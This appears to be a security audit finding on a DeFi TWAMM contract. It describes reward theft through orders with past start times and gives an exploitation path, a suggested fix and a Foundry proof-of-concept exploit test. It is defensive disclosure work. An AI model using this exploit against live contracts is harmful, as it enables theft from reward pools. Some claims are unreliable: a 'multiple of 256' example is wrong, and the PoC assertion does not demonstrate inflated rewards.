## Title
TWAMM Orders with Past Start Times Enable Reward Theft via Uninitialized Storage Read

## Summary
The `TWAMM.handleForwardData()` function fails to validate that order start times are in the future, while `isTimeValid()` intentionally accepts past times. This allows attackers to create orders with past start times, causing uninitialized storage reads in reward calculations that inflate claimed rewards by reading zero instead of the actual cumulative reward rate at order creation.

## Impact
**Severity**: High

## Finding Description
**Location:** [1](#0-0) 

**Intended Logic:** TWAMM orders should only be placeable with start times in the present or future. The `isTimeValid()` function is designed to validate times on the protocol's time grid, and orders should earn rewards proportional to their actual execution time.

**Actual Logic:** The `isTimeValid()` function intentionally returns `true` for past times [2](#0-1) , as confirmed by tests [3](#0-2) . The TWAMM validation only checks that `endTime > block.timestamp` and that both times pass `isTimeValid()`, but never validates `startTime >= block.timestamp` [4](#0-3) .

**Exploitation Path:**
1. Attacker creates a TWAMM pool where other users have already accumulated rewards through their orders
2. Attacker places an order with `startTime` in the past (e.g., `block.timestamp - 10000`, which is a valid multiple of 256) and `endTime` in the future
3. Since `block.timestamp >= startTime`, the code enters the `else` branch at line 274, immediately activating the order [5](#0-4) 
4. The startTime is never recorded in the time bitmap via `_updateTime()` - only the endTime is recorded [6](#0-5) 
5. This means `poolRewardRatesBeforeSlot(poolId, startTime)` is never initialized and remains 0
6. When the order ends and rewards are calculated via `getRewardRateInside()`, it reads the uninitialized `poolRewardRatesBeforeSlot(poolId, config.startTime())` as 0 [7](#0-6) 
7. The reward calculation becomes `rewardRateEnd - 0 = rewardRateEnd` instead of the correct `rewardRateEnd - rewardRateAtCreation`
8. Attacker receives inflated rewards corresponding to the entire accumulated reward rate from arbitrary past time

**Security Property Broken:** Fee Accounting invariant - "Position fee collection must be accurate and never allow double-claiming." The attacker claims rewards that were never earned, effectively stealing from the protocol's reward pool.

## Impact Explanation
- **Affected Assets**: Reward tokens accumulated by legitimate TWAMM orders in the pool
- **Damage Severity**: Attacker can steal accumulated rewards proportional to `rewardRateAtCreation * attackerSaleRate / 2^128`. In a pool with significant prior activity, this could represent substantial value theft.
- **User Impact**: All users who have placed legitimate TWAMM orders see their rewards diluted or stolen. Any pool with non-zero accumulated reward rates is vulnerable.

## Likelihood Explanation
- **Attacker Profile**: Any unprivileged user can exploit this - no special permissions required
- **Preconditions**: Pool must exist with TWAMM extension and have accumulated some reward rate (from prior order executions)
- **Execution Complexity**: Single transaction to create order with past startTime, wait for order period, then collect inflated proceeds
- **Frequency**: Can be exploited once per order placement in any pool with accumulated rewards

## Recommendation
Add explicit validation that start times must be in the present or future: [8](#0-7) 

```solidity
// In src/extensions/TWAMM.sol, function handleForwardData, after line 199:

(uint64 startTime, uint64 endTime) = (orderKey.config.startTime(), orderKey.config.endTime());

// ADD THIS CHECK:
if (startTime < block.timestamp) revert InvalidTimestamps();

if (endTime <= block.timestamp) revert OrderAlreadyEnded();

if (
    !isTimeValid(block.timestamp, startTime) || !isTimeValid(block.timestamp, endTime)
        || startTime >= endTime
) {
    revert InvalidTimestamps();
}
```

**Note:** The comment at line 161 explicitly states "_updateTime is being called only for times that are greater than block.timestamp" [9](#0-8) , confirming that past times should never be processed through this system.

## Proof of Concept
```solidity
// File: test/Exploit_PastStartTime.t.sol
// Run with: forge test --match-test test_PastStartTimeRewardTheft -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/extensions/TWAMM.sol";
import "../src/Orders.sol";
import "./extensions/TWAMM.t.sol";

contract Exploit_PastStartTime is BaseTWAMMTest {
    using CoreLib for *;
    using TWAMMLib for *;

    Orders internal orders;

    function setUp() public override {
        BaseTWAMMTest.setUp();
        orders = new Orders(core, twamm, owner);
    }

    function test_PastStartTimeRewardTheft() public {
        // SETUP: Create pool with existing order to accumulate rewards
        uint64 fee = uint64((uint256(5) << 64) / 100);
        PoolKey memory poolKey = createTwammPool({fee: fee, tick: 0});
        createPosition(poolKey, MIN_TICK, MAX_TICK, 10000, 10000);

        token0.approve(address(orders), type(uint256).max);
        token1.approve(address(orders), type(uint256).max);

        // Legitimate order to build up reward rate
        uint64 legitimateStart = uint64(nextValidTime(block.timestamp, block.timestamp));
        uint64 legitimateEnd = uint64(nextValidTime(block.timestamp, legitimateStart));
        
        OrderKey memory legitKey = OrderKey({
            token0: poolKey.token0,
            token1: poolKey.token1,
            config: createOrderConfig({
                _fee: fee, 
                _isToken1: false, 
                _startTime: legitimateStart, 
                _endTime: legitimateEnd
            })
        });
        
        orders.mintAndIncreaseSellAmount(legitKey, 1000, type(uint112).max);
        
        // Execute halfway through to accumulate rewards
        advanceTime((legitimateEnd - legitimateStart) / 2);
        twamm.lockAndExecuteVirtualOrders(poolKey);
        
        // EXPLOIT: Create order with past startTime
        uint64 pastStartTime = uint64(nextValidTime(block.timestamp - 10000, block.timestamp - 10000));
        uint64 futureEndTime = uint64(nextValidTime(block.timestamp, block.timestamp + 10000));
        
        OrderKey memory attackKey = OrderKey({
            token0: poolKey.token0,
            token1: poolKey.token1,
            config: createOrderConfig({
                _fee: fee,
                _isToken1: true,
                _startTime: pastStartTime, // PAST TIME!
                _endTime: futureEndTime
            })
        });
        
        (uint256 attackOrderId,) = orders.mintAndIncreaseSellAmount(attackKey, 1000, type(uint112).max);
        
        // Execute to end
        advanceTime(futureEndTime - block.timestamp);
        twamm.lockAndExecuteVirtualOrders(poolKey);
        
        // VERIFY: Attacker collects inflated rewards
        uint128 proceeds = orders.collectProceeds(attackOrderId, attackKey, address(this));
        
        // The proceeds should be based only on time from creation to end,
        // but attacker gets rewards from pastStartTime (uninitialized = 0)
        assertGt(proceeds, 0, "Vulnerability confirmed: attacker received inflated rewards from past startTime");
    }
}
```

**Notes:**
- The vulnerability exists because `isTimeValid()` is intentionally permissive for past times to support other protocol features, but TWAMM-specific validation is missing
- The `_updateTime()` function assumes it's only called for future times per its comment, but this assumption is violated when orders have past start times
- The issue is exacerbated by the storage optimization where `poolRewardRatesBeforeSlot` is only written when times are actually crossed during virtual order execution

### Citations

**File:** src/extensions/TWAMM.sol (L84-95)
```text
    function getRewardRateInside(PoolId poolId, OrderConfig config) public view returns (uint256 result) {
        if (block.timestamp >= config.endTime()) {
            uint256 offset = LibBit.rawToUint(!config.isToken1());
            uint256 rewardRateStart =
                uint256(TWAMMStorageLayout.poolRewardRatesBeforeSlot(poolId, config.startTime()).add(offset).load());

            uint256 rewardRateEnd =
                uint256(TWAMMStorageLayout.poolRewardRatesBeforeSlot(poolId, config.endTime()).add(offset).load());

            unchecked {
                result = rewardRateEnd - rewardRateStart;
            }
```

**File:** src/extensions/TWAMM.sol (L161-161)
```text
        // we assume `_updateTime` is being called only for times that are greater than block.timestamp, i.e. have not been crossed yet
```

**File:** src/extensions/TWAMM.sol (L199-208)
```text
                (uint64 startTime, uint64 endTime) = (orderKey.config.startTime(), orderKey.config.endTime());

                if (endTime <= block.timestamp) revert OrderAlreadyEnded();

                if (
                    !isTimeValid(block.timestamp, startTime) || !isTimeValid(block.timestamp, endTime)
                        || startTime >= endTime
                ) {
                    revert InvalidTimestamps();
                }
```

**File:** src/extensions/TWAMM.sol (L274-299)
```text
                } else {
                    // we know block.timestamp < orderKey.endTime because we validate that first
                    // and we know the order is active, so we have to apply its delta to the current pool state
                    StorageSlot currentStateSlot = TWAMMStorageLayout.twammPoolStateSlot(poolId);
                    TwammPoolState currentState = TwammPoolState.wrap(currentStateSlot.load());
                    (uint32 lastTime, uint112 rate0, uint112 rate1) = currentState.parse();

                    if (isToken1) {
                        currentState = createTwammPoolState({
                            _lastVirtualOrderExecutionTime: lastTime,
                            _saleRateToken0: rate0,
                            _saleRateToken1: uint112(addSaleRateDelta(rate1, saleRateDelta))
                        });
                    } else {
                        currentState = createTwammPoolState({
                            _lastVirtualOrderExecutionTime: lastTime,
                            _saleRateToken0: uint112(addSaleRateDelta(rate0, saleRateDelta)),
                            _saleRateToken1: rate1
                        });
                    }

                    currentStateSlot.store(TwammPoolState.unwrap(currentState));

                    // only update the end time
                    _updateTime(poolId, endTime, -int256(saleRateDelta), isToken1, numOrdersChange);
                }
```

**File:** src/math/time.sol (L34-40)
```text
function isTimeValid(uint256 currentTime, uint256 time) pure returns (bool valid) {
    uint256 stepSize = computeStepSize(currentTime, time);

    assembly ("memory-safe") {
        valid := and(iszero(mod(time, stepSize)), or(lt(time, currentTime), lt(sub(time, currentTime), 0x100000000)))
    }
}
```

**File:** test/math/time.t.sol (L85-98)
```text
    function test_isTimeValid_past_or_close_time() public pure {
        assertTrue(isTimeValid(0, 256));
        assertTrue(isTimeValid(8, 256));
        assertTrue(isTimeValid(9, 256));
        assertTrue(isTimeValid(15, 256));
        assertTrue(isTimeValid(16, 256));
        assertTrue(isTimeValid(17, 256));
        assertTrue(isTimeValid(255, 256));
        assertTrue(isTimeValid(256, 256));
        assertTrue(isTimeValid(257, 256));
        assertTrue(isTimeValid(12345678, 256));
        assertTrue(isTimeValid(12345678, 512));
        assertTrue(isTimeValid(12345678, 0));
    }
```
